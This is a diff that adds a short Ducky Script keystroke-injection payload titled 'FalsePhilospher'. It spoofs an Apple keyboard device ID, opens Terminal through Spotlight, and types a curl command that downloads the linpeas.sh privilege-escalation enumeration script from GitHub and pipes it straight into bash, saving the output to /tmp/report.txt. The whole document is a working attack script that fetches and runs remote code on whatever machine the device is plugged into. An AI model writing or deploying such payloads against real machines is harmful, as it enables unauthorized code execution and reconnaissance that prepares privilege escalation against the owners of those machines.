@@ -1,0 +1,12 @@
+REM FalsePhilospher
+ID 05ac:021e Apple:Keyboard
+DELAY 300
+COMMAND SPACE
+DELAY 500
+STRING terminal.app
+DELAY 1000
+ENTER
+DELAY 1500
+STRING curl -s -L https://github.com/carlospolop/PEASS-ng/releases/download/20220703/linpeas.sh | bash >/tmp/report.txt
+DELAY 300
+ENTER
